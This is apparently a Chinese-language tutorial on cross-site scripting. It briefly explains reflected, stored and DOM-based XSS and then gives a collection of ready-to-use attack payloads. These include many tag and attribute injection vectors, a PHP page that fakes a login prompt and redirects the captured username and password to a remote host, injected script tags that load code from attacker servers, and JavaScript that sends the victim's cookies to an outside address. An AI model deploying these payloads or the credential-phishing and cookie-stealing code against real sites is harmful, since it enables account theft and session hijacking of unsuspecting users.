### XSS攻击的利用及原理

#### XSS简介
	全称:XSS跨站脚本攻击，是为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在WEB应用中的计算机安全漏洞，它允许恶意WEB用户将代码植入到WEB网站里面，供给其他用户访问，当用户访问到有恶意代码的网页就会产生XSS攻击。

#### 反射型XSS
	反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是 说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射 型XSS也叫做“非持久型XSS”（Non-persistent XSS）。

#### 存储型XSS
	存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有 很强的稳定性。 比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码 的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的 浏览器中执行这段恶意的JavaScript代码。黑客把恶意的脚本保存到服务 器端，所以这种XSS攻击就叫做“存储型XSS”。 存储型XSS通常也叫做“持久型XSS”（Persistent XSS），因为从效 果上来说，它存在的时间是比较长的。

#### Dom型XSS
	实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划 分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是 因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出 了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。 通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。

### XSS攻击技巧

#### FRAMESET标签执行JS代码

```html
<frameset onload=alert(1)>
```

#### TABLE标签执行JS代码

```html
<table background="javascript:alert(1)"></table>
```

#### IMG标签执行JS代码

```html
<img src="#" onerror=alert(1) />
```

#### SCRIPT标签执行JS代码

```html
<script>alert(1)</script>
```

#### OBJECT标签执行JS代码

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><object>
```

#### SRC执行JS代码

```html
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
```

```html
<embed src="javascript:alert(1)"></embed>
```

#### SRC属性执行JS代码

```html
<embed src="javascript:alert(1)"></embed>
<img src="javascript:alert(1)">
<image src="javascript:alert(2)">
<script src="javascript:alert(3)"></script>
```

#### Dom型攻击代码

```JS
#'onclick="alert(111)"
```

### XSS钓鱼技巧

#### PHP代码 - 钓鱼页面

```php

<?php
error_reporting(0);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='认证'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
	header("Location: http://10.1.25.1:8881/xss/?users={$_SERVER[PHP_AUTH_USER]}&pwd={$_SERVER[PHP_AUTH_PW]}");
}
 
?>

```

#### XSS攻击代码

```html
<script src="http://10.1.25.3:8001/session.php"></script>
```

### XSS窃取Cookie

#### JS代码

```js
var img=document.createElement("img"); img.src="http://10.1.25.3:8001/api/eccffb1cfb7c6cc2?host="+escape(document.location.host)+"&cookie="+escape(document.cookie); document.body.appendChild(img);
```

#### XSS攻击代码

```html
<script src="http://10.10.10.25:8001/static/js/xss.js"></script>
```